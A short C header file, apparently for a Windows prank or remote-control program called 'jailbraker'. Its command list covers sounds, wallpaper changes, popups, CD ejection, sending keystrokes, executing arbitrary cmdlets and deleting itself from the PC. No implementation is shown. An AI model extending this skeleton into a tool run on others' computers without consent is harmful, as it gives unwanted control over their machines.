#ifndef FUN
#define FUN

#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>


#define CMD_ARGSZ 0x100

typedef enum {
    /* --- Templates --- */
    JB_FUN,
    JB_DEACTIVE,    // Deactive jailbraker
    JB_REMOVE,      // Delete from pc completely

    /* --- Sounds --- */
    JB_VOLUME,
    JB_SZAMBO,      
    // ... //
    JB_SCREAM,

    /* --- Wallpaper --- */
    JB_SETWALL,
    JB_SAVEWALL,
    JB_LOADWALL,

    /* --- Shortcuts --- */
    JB_CREATELINKS,
    JB_REMOVELINKS,
    JB_OPENWEB,

    /* --- Other --- */
    JB_CDEJECT,     // eject disk drive
    JB_POPUP,       // MessageBox
    JB_CMD,         // execute a cmdlet
    JB_ROTATESCR,   // SetDisplayAutoRotationPreferences
    JB_CHANGERES,   

    JB_SENDKEY      // ?
} JB_InstructionSet;

typedef struct {
    JB_InstructionSet cmd; 
    char args[CMD_ARGSZ];
} JBCMD;

char *wallpaper;

WINBOOL changeWallpaper(const wchar_t *path);
void execCommand(JBCMD cmd);
// TODO: implement these
void sendError(const char *message);

#endif